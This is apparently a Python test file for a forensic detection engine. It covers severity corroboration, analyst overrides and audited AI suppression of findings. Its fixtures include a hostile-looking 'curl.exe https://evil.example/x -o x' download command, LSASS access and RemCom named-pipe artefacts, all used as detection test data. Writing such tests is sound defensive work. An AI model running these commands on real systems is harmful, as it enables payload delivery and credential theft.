from __future__ import annotations

# ruff: noqa: E402
#
# Coverage for the conservative-severity + corroboration model and the user
# override controls (mark-benign / disable-rule):
#   * two independent low findings on the same entity escalate to medium;
#   * marking a finding benign forces it to info and it stays info across a rebuild;
#   * disabling a rule forces every finding of that rule to info; re-enabling restores
#     the engine-produced severity.

import json
import sys
import tempfile
import types
import unittest
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch


class _BaseModel:
    def __init__(self, **kwargs):
        for key, value in kwargs.items():
            setattr(self, key, value)

    @classmethod
    def model_validate(cls, data):
        return cls(**data)

    def model_dump_json(self, indent=None):
        return "{}"


sys.modules.setdefault("keyring", types.SimpleNamespace(
    get_password=lambda *_a, **_k: None,
    set_password=lambda *_a, **_k: None,
    delete_password=lambda *_a, **_k: None,
    errors=types.SimpleNamespace(PasswordDeleteError=Exception),
))
sys.modules.setdefault("pydantic", types.SimpleNamespace(
    BaseModel=_BaseModel,
    Field=lambda default=None, default_factory=None, **_k: default_factory() if default_factory else default,
))

from sqlalchemy import select
from app.detect import engine, entity_graph, overrides
from app.llm import orchestrator
from app.llm.tools import execute_tool, get_case_overview, get_findings, run_tool_loop
from app.memory.pipeline import _grade_handle
from app.store import cases
from app.store import database
from app.store.database import Event, Finding, Process


class _Base(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
        ]
        for p in self.patches:
            p.start()
        self.case = cases.create_case("ov")
        self.cid = self.case["id"]

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        for p in reversed(self.patches):
            p.stop()
        self.tmp.cleanup()

    def _session(self):
        return cases.get_session(self.cid)

    def _findings(self):
        s = self._session()
        try:
            return {(f.title, f.severity) for f in s.scalars(select(Finding))}
        finally:
            s.close()


class CorroborationTests(_Base):
    def test_two_low_findings_on_same_entity_escalate_to_medium(self) -> None:
        # A single process that (a) is a LOLBin invocation with args -> low, and
        # (b) runs from a staging dir -> low. Two independent low rules on the
        # same entity should corroborate up to medium.
        s = self._session()
        try:
            s.add(Process(
                pid=4321, ppid=None, name="curl.exe",
                path=r"C:\Users\v\AppData\Local\Temp\curl.exe",
                cmdline="curl.exe https://evil.example/x -o x", session_id="live",
                flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)

        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: curl.exe"), "medium")
        self.assertEqual(by_title.get("Execution from suspicious directory: curl.exe"), "medium")

    def test_corroboration_is_idempotent_across_reruns(self) -> None:
        # The ingest/memory pipelines re-run detections without wiping findings;
        # re-running must not compound the escalation (low+low -> medium, forever).
        s = self._session()
        try:
            s.add(Process(
                pid=4321, ppid=None, name="curl.exe",
                path=r"C:\Users\v\AppData\Local\Temp\curl.exe",
                cmdline="curl.exe https://evil.example/x -o x", session_id="live",
                flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)
        engine.run_detections_sync(self.cid)
        engine.run_detections_sync(self.cid)
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: curl.exe"), "medium")
        self.assertEqual(by_title.get("Execution from suspicious directory: curl.exe"), "medium")

    def test_lone_low_finding_stays_low(self) -> None:
        s = self._session()
        try:
            # Only the suspicious-dir rule fires (a plain exe, not a LOLBin).
            s.add(Process(
                pid=99, ppid=None, name="tool.exe",
                path=r"C:\Users\v\AppData\Local\Temp\tool.exe",
                cmdline="tool.exe", session_id="live", flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("Execution from suspicious directory: tool.exe"), "low")


class OverrideTests(_Base):
    def _seed_two_lolbins(self) -> None:
        s = self._session()
        try:
            s.add(Process(
                pid=10, ppid=None, name="mshta.exe", path=r"C:\Windows\System32\mshta.exe",
                cmdline="mshta.exe C:\\x\\a.hta", session_id="live", flags=[], severity="info",
            ))
            s.add(Process(
                pid=11, ppid=None, name="cscript.exe", path=r"C:\Windows\System32\cscript.exe",
                cmdline="cscript.exe C:\\x\\b.vbs", session_id="live", flags=[], severity="info",
            ))
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(self.cid)

    def test_disable_rule_forces_all_to_info_and_reenable_restores(self) -> None:
        self._seed_two_lolbins()
        # Both LOLBin findings start at medium.
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"medium"},
        )
        # Disable the lolbin-activity rule.
        s = self._session()
        try:
            overrides.set_rule_disabled(s, "lolbin-activity", True)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"info"},
        )
        graph = entity_graph.build_entity_graph(self.cid)
        lolbin_nodes = {
            n["label"]: n["severity"]
            for n in graph["nodes"]
            if n["type"] == "process" and n["label"] in {"mshta.exe", "cscript.exe"}
        }
        self.assertEqual(lolbin_nodes, {"mshta.exe": "info", "cscript.exe": "info"})
        # Survives a full rebuild (findings wiped + regenerated).
        engine.run_detections_sync(self.cid)
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"info"},
        )
        # Re-enable -> engine-produced severity comes back.
        s = self._session()
        try:
            overrides.set_rule_disabled(s, "lolbin-activity", False)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()
        self.assertEqual(
            {sev for t, sev in self._findings() if t.startswith("LOLBin activity")},
            {"medium"},
        )

    def test_mark_benign_forces_info_and_survives_rebuild(self) -> None:
        self._seed_two_lolbins()
        s = self._session()
        try:
            f = s.scalars(select(Finding).where(Finding.title == "LOLBin activity: mshta.exe")).one()
            key = overrides.finding_key(f.title, f.evidence)
            overrides.set_finding_benign(s, key, True)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: mshta.exe"), "info")
        # The other finding is untouched.
        self.assertEqual(by_title.get("LOLBin activity: cscript.exe"), "medium")
        graph = entity_graph.build_entity_graph(self.cid)
        by_process = {
            n["label"]: n["severity"]
            for n in graph["nodes"]
            if n["type"] == "process" and n["label"] in {"mshta.exe", "cscript.exe"}
        }
        self.assertEqual(by_process.get("mshta.exe"), "info")
        self.assertEqual(by_process.get("cscript.exe"), "medium")
        # Benign mark persists across a rebuild (keyed by stable identity).
        engine.run_detections_sync(self.cid)
        by_title = {t: sev for t, sev in self._findings()}
        self.assertEqual(by_title.get("LOLBin activity: mshta.exe"), "info")

    def test_mark_benign_downgrades_backing_event_in_entity_graph(self) -> None:
        s = self._session()
        try:
            ev = Event(
                timestamp=None,
                host="H",
                source="Windows.EventLogs.Evtx.json",
                category="process",
                entity="svchost.exe",
                severity="high",
                severity_reason="Detection: cross-process access",
                summary=r"ProcessAccess: C:\Windows\System32\svchost.exe -> lsass.exe",
                raw={"EventID": 10, "ProcessName": r"C:\Windows\System32\svchost.exe"},
            )
            s.add(ev)
            s.flush()
            s.add(Finding(
                title="Suspicious process access",
                description="Process accessed LSASS",
                severity="high",
                mitre_techniques=["T1003.001"],
                evidence={"event_id": ev.id, "entity": "svchost.exe"},
                source="event:Windows.EventLogs.Evtx.json",
            ))
            s.add(Event(
                timestamp=None,
                host="H",
                source="Windows.EventLogs.Evtx.json",
                category="process",
                entity="svchost.exe",
                severity="high",
                severity_reason=(
                    "Flagged-entity match: this event references 'svchost.exe' - "
                    "a high-severity event involved svchost.exe"
                ),
                summary=r"Process activity from C:\Windows\System32\svchost.exe",
                raw={"EventID": 1, "ProcessName": r"C:\Windows\System32\svchost.exe"},
            ))
            s.commit()
        finally:
            s.close()

        graph = entity_graph.build_entity_graph(self.cid)
        node = next(n for n in graph["nodes"] if n["id"] == "process::C:\\Windows\\System32\\svchost.exe")
        self.assertEqual(node["severity"], "high")

        s = self._session()
        try:
            f = s.scalars(select(Finding).where(Finding.title == "Suspicious process access")).one()
            overrides.set_finding_benign(s, overrides.finding_key(f.title, f.evidence), True)
            overrides.apply_overrides(s)
            s.commit()
        finally:
            s.close()

        graph = entity_graph.build_entity_graph(self.cid)
        node = next(n for n in graph["nodes"] if n["id"] == "process::C:\\Windows\\System32\\svchost.exe")
        self.assertEqual(node["severity"], "info")

    def test_rule_id_families(self) -> None:
        self.assertEqual(overrides.rule_id_for("LOLBin activity: msiexec.exe", ""), "lolbin-activity")
        self.assertEqual(overrides.rule_id_for("LOLBin activity: curl.exe", ""), "lolbin-activity")
        self.assertEqual(overrides.rule_id_for("Web attack: sqlmap scanner user-agent", ""),
                         "web-sqlmap-scanner-user-agent")
        self.assertEqual(overrides.rule_id_for("Golden ticket attack", ""), "golden-ticket-attack")
        self.assertEqual(overrides.rule_id_for("New service installed", ""), "new-service-installed")

    def test_ai_suppression_requires_high_confidence_valid_evidence_and_is_audited(self) -> None:
        s = self._session()
        try:
            event = Event(
                timestamp=datetime.now(timezone.utc), host="H", source="test", category="process",
                entity="tool.exe", severity="info", summary="Known administrative execution", raw={},
            )
            finding = Finding(
                title="Suspicious tool", description="Needs review", severity="high",
                mitre_techniques=[], evidence={"entity": "tool.exe"}, source="detector",
            )
            s.add_all([event, finding])
            s.commit()
            denied = execute_tool(s, "suppress_finding", {
                "finding_id": finding.id, "confidence": "medium",
                "rationale": "The exact event shows expected administrative activity.",
                "evidence_refs": [{"type": "event", "id": event.id}],
            }, allow_suppression=True)
            self.assertIn("requires confidence", denied)
            invalid_evidence = execute_tool(s, "suppress_finding", {
                "finding_id": finding.id, "confidence": "high",
                "rationale": "The claimed supporting record does not actually exist.",
                "evidence_refs": [{"type": "event", "id": 999999}],
            }, allow_suppression=True)
            self.assertIn("no supplied evidence", invalid_evidence)
            result = execute_tool(s, "suppress_finding", {
                "finding_id": finding.id, "confidence": "high",
                "rationale": "The exact event shows expected administrative activity.",
                "evidence_refs": [{"type": "event", "id": event.id}],
            }, allow_suppression=True)
            self.assertIn("finding_suppressed", result)
            s.refresh(finding)
            self.assertEqual(finding.severity, "info")
            details = overrides.get_suppression_details(s, finding)
            self.assertEqual(details["actor"], "ai")
            self.assertEqual(details["evidence_refs"], [{"type": "event", "id": event.id}])
            manual = Finding(
                title="Analyst decision", description="Keep", severity="medium",
                mitre_techniques=[], evidence={"manual": True}, source="manual",
            )
            s.add(manual)
            s.commit()
            manual_result = execute_tool(s, "suppress_finding", {
                "finding_id": manual.id, "confidence": "high",
                "rationale": "This rationale is long enough but must still be rejected.",
                "evidence_refs": [{"type": "event", "id": event.id}],
            }, allow_suppression=True)
            self.assertIn("analyst-created", manual_result)
        finally:
            s.close()

    def test_suppressed_findings_are_hidden_from_default_ai_tool(self) -> None:
        self._seed_two_lolbins()
        s = self._session()
        try:
            finding = s.scalars(select(Finding).where(Finding.title.like("%mshta%"))).one()
            overrides.set_finding_benign(s, overrides.finding_key(finding.title, finding.evidence), True)
            overrides.apply_overrides(s)
            s.commit()
            default = get_findings(s, {"limit": 20})
            complete = get_findings(s, {"limit": 20, "include_suppressed": True})
            self.assertNotIn("mshta.exe", default)
            self.assertIn("mshta.exe", complete)
        finally:
            s.close()

    def test_timeline_rejects_unknown_ids_and_derives_server_timestamps(self) -> None:
        event = Event(
            id=7, timestamp=datetime(2026, 1, 2, tzinfo=timezone.utc), host="H", source="test",
            category="process", entity="x", severity="high", summary="Executed x", raw={},
        )
        finding = Finding(
            id=4, title="X", description="x", severity="high", mitre_techniques=[],
            evidence={"event_id": 7}, source="detector",
        )
        entries = orchestrator._validated_timeline([
            {"title": "Valid", "description": "Grounded", "confidence": "high", "event_ids": [7], "finding_ids": [4]},
            {"title": "Invented", "description": "Bad", "event_ids": [999], "finding_ids": []},
        ], [event], [finding])
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["start"], event.timestamp.isoformat())
        self.assertEqual(entries[0]["finding_ids"], [4])

    def test_service_hosted_windows_root_process_and_remcom_pipes_become_findings(self) -> None:
        s = self._session()
        try:
            s.add(Process(
                pid=452, ppid=220, name="services.exe", path=r"C:\Windows\System32\services.exe",
                cmdline="services.exe", session_id="mem-case", flags=[], severity="info",
            ))
            s.add(Process(
                pid=2132, ppid=452, name="LiDseDHx.exe", path=r"C:\Windows\LiDseDHx.exe",
                cmdline=r"C:\Windows\LiDseDHx.exe", session_id="mem-case",
                flags=["hollowing-suspect"], severity="medium",
            ))
            for index, pipe in enumerate((
                r"\NamedPipe\RemCom_communicaton",
                r"\NamedPipe\RemCom_stdinjYrC2213",
                r"\NamedPipe\RemCom_stdoutjYrC2213",
                r"\NamedPipe\RemCom_stderrjYrC2213",
            )):
                s.add(Event(
                    timestamp=None, host=None, source="memory:handles", category="handle",
                    entity="LiDseDHx.exe", severity="info",
                    summary=f"LiDseDHx.exe (pid 2132) handle File -> {pipe}",
                    raw={"PID": 2132, "Process": "LiDseDHx.exe", "Handle": index,
                         "Type": "File", "Name": pipe, "Access": 1180063},
                ))
            s.add(Event(
                timestamp=None, host=None, source="memory:handles", category="handle",
                entity="LiDseDHx.exe", severity="high",
                summary="LiDseDHx.exe handle Process -> PID 948 - cmd.exe",
                raw={"PID": 2132, "Process": "LiDseDHx.exe", "Type": "Process",
                     "Name": "PID 948 - cmd.exe", "TargetPID": 2132, "Access": 2097151,
                     "risk": "high", "risk_reasons": ["dangerous process access"]},
            ))
            s.commit()
        finally:
            s.close()

        engine.run_detections_sync(self.cid)
        s = self._session()
        try:
            titles = {finding.title: finding for finding in s.scalars(select(Finding))}
            self.assertIn("Service-hosted executable in Windows root: LiDseDHx.exe", titles)
            pipe_title = "RemCom named-pipe activity by LiDseDHx.exe (pid 2132)"
            self.assertIn(pipe_title, titles)
            self.assertEqual(titles[pipe_title].severity, "high")
            self.assertEqual(len(titles[pipe_title].evidence["event_ids"]), 4)
            overview = get_case_overview(s, {})
            self.assertIn("LiDseDHx.exe", overview)
            self.assertIn("RemCom_communicaton", overview)
            handles = json.loads(execute_tool(
                s, "get_process_handles", {"pid": 2132, "limit": 20}, case_id=self.cid
            ))
            self.assertIn("RemCom_stdout", json.dumps(handles))
            process_handle = next(handle for handle in handles["handles"] if handle["type"] == "Process")
            self.assertEqual(process_handle["target_pid"], 948)
        finally:
            s.close()

    def test_context_collapses_ai_paraphrases_but_keeps_second_process(self) -> None:
        findings = [
            Finding(id=1, title="Process hollowing on qTbZGdHw.exe", description="Hollowing", severity="high",
                    mitre_techniques=[], evidence={"entity": "qTbZGdHw.exe"}, source="detector"),
            Finding(id=2, title="Process Hollowing Indicators", description="qTbZGdHw.exe hollowing", severity="high",
                    mitre_techniques=[], evidence={"entity": "qTbZGdHw.exe"}, source="ai-analysis"),
            Finding(id=3, title="Service execution by LiDseDHx.exe", description="Second process service", severity="high",
                    mitre_techniques=[], evidence={"entity": "LiDseDHx.exe"}, source="ai-analysis"),
        ]
        compact = orchestrator._context_findings(findings, 10)
        self.assertEqual({finding.id for finding in compact}, {1, 3})

    def test_event_sampling_excludes_propagated_historical_noise(self) -> None:
        old = Event(
            id=1, timestamp=datetime(2012, 1, 1, tzinfo=timezone.utc), host="H", source="mft",
            category="filesystem", entity="smss.exe", severity="critical",
            severity_reason="Flagged-entity match: smss.exe", summary="Old file timestamp", raw={},
        )
        current = Event(
            id=2, timestamp=datetime(2021, 4, 16, tzinfo=timezone.utc), host="H", source="memory",
            category="process", entity="evil.exe", severity="high", severity_reason=None,
            summary="Suspicious process execution", raw={},
        )
        sampled = orchestrator._sample_events([old, current], [], limit=10)
        self.assertEqual([event.id for event in sampled], [2])

    def test_remcom_named_pipe_is_a_bounded_medium_signal(self) -> None:
        severity, risk, reasons = _grade_handle(
            1800, "File", r"\NamedPipe\RemCom_stdoutABC123", None, "", 0x120116,
        )
        self.assertEqual((severity, risk), ("medium", "medium"))
        self.assertIn("RemCom", reasons[0])

    def test_sample_events_keeps_finding_linked_and_medium_events(self) -> None:
        linked = Event(
            id=5, timestamp=datetime(2021, 1, 1, tzinfo=timezone.utc), host="H", source="mem",
            category="process", entity="evil.exe", severity="low", severity_reason=None,
            summary="Linked low-severity execution", raw={},
        )
        medium = Event(
            id=6, timestamp=datetime(2021, 1, 2, tzinfo=timezone.utc), host="H", source="mem",
            category="process", entity="other.exe", severity="medium", severity_reason=None,
            summary="Standalone medium execution", raw={},
        )
        noise = Event(
            id=7, timestamp=datetime(2021, 1, 3, tzinfo=timezone.utc), host="H", source="mft",
            category="filesystem", entity="quiet.exe", severity="low", severity_reason=None,
            summary="Routine file metadata", raw={},
        )
        finding = Finding(
            id=1, title="Execution", description="x", severity="high", mitre_techniques=[],
            evidence={"event_id": 5, "entity": "evil.exe"}, source="detector",
        )
        sampled = {e.id for e in orchestrator._sample_events([linked, medium, noise], [finding], limit=10)}
        self.assertIn(5, sampled)    # cited by a finding -> kept despite low severity
        self.assertIn(6, sampled)    # kept on its own medium severity
        self.assertNotIn(7, sampled)  # low, unlinked, non-priority entity -> dropped

    def test_semantically_matches_guards_against_different_entities(self) -> None:
        existing = Finding(
            id=1, title="Process hollowing on aaa.exe", description="hollowing detected",
            severity="high", mitre_techniques=[], evidence={"entity": "aaa.exe"}, source="detector",
        )
        # Same wording, different concrete entity -> must NOT be treated as a duplicate.
        self.assertFalse(orchestrator._semantically_matches(
            "Process hollowing on bbb.exe", "hollowing detected", "bbb.exe", existing,
        ))
        # Same entity, shared topic -> correctly collapsed as a paraphrase.
        self.assertTrue(orchestrator._semantically_matches(
            "Hollowing indicators", "aaa.exe hollowing", "aaa.exe", existing,
        ))

    def test_suppression_intent_matches_commands_not_questions(self) -> None:
        commands = [
            "suppress finding 5",
            "please mark finding #5 as benign",
            "mark it benign, it's expected admin activity",
            "dismiss this finding",
            "ignore this finding",
            "treat finding 5 as a false positive",
            "flag it as benign",
        ]
        questions = [
            "is finding 5 a false positive?",
            "could this be benign?",
            "why was this finding flagged?",
            "what does this finding mean?",
            "are these benign or malicious?",
        ]
        for text in commands:
            self.assertTrue(orchestrator._requests_suppression(text), text)
        for text in questions:
            self.assertFalse(orchestrator._requests_suppression(text), text)


class ToolBudgetTests(unittest.IsolatedAsyncioTestCase):
    async def test_zero_budget_forces_one_final_response_without_tool_execution(self) -> None:
        class Provider:
            calls = 0

            async def complete(self, _messages, stream=False):
                self.calls += 1
                return '{"final":"done"}'

        provider = Provider()
        text, trace = await run_tool_loop(None, provider, "system", "question", max_iters=0)
        self.assertEqual(text, "done")
        self.assertEqual(trace, [])
        self.assertEqual(provider.calls, 1)


class JsonRepairTests(unittest.IsolatedAsyncioTestCase):
    """The report package is a plain completion; local models routinely wrap or
    malform JSON, so `_complete_json` gets one repair round before deterministic
    fallbacks take over."""

    class _SeqProvider:
        def __init__(self, responses):
            self.responses = list(responses)
            self.calls = 0

        async def complete(self, _messages, stream=False):
            self.calls += 1
            return self.responses.pop(0) if self.responses else "{}"

    async def _run(self, responses):
        provider = self._SeqProvider(responses)
        with patch.object(orchestrator, "get_provider", return_value=provider):
            result = await orchestrator._complete_json(
                [{"role": "user", "content": "x"}], orchestrator._parse_report_package,
            )
        return result, provider.calls

    async def test_valid_json_needs_no_repair(self) -> None:
        result, calls = await self._run(['{"summary": "good", "timeline_entries": []}'])
        self.assertEqual(result.get("summary"), "good")
        self.assertEqual(calls, 1)

    async def test_malformed_json_is_repaired_on_retry(self) -> None:
        result, calls = await self._run([
            "Sure! Here is the report: (no json here)",
            '{"summary": "recovered", "finding_verdicts": []}',
        ])
        self.assertEqual(result.get("summary"), "recovered")
        self.assertEqual(calls, 2)

    async def test_unrecoverable_json_degrades_to_empty(self) -> None:
        result, calls = await self._run(["nope", "still nope"])
        self.assertEqual(result, {})
        self.assertEqual(calls, 2)  # one attempt + one repair, then give up


if __name__ == "__main__":
    unittest.main()
